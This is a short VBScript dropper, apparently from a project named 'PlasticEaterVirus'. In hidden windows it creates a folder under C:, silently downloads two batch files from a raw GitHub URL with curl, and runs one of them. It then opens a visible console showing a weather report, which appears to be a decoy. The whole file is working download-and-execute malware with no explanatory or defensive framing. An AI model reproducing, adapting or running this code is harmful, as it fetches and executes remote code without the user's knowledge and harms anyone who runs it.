Dim oShell
Set oShell = WScript.CreateObject ("WScript.Shell")
oShell.run "cmd.exe /C mkdir ""c:/PlasticEater""", 0
oShell.run "cmd.exe /C cd c:/PlasticEater & curl https://raw.githubusercontent.com/ETML-Midicix/PlasticEaterVirus/main/Program/PlasticEater.bat -L -O -s", 0
oShell.run "cmd.exe /C cd c:/PlasticEater & curl https://raw.githubusercontent.com/ETML-Midicix/PlasticEaterVirus/main/Program/rilldocker.bat -L -O -s & PlasticEater.bat", 0


Dim Shell
Set Shell = WScript.CreateObject ("WScript.Shell")
Shell.run "cmd.exe /C @ECHO OFF & mode con: cols=132 lines=42 & CLS & curl https://wttr.in/ & pause", 1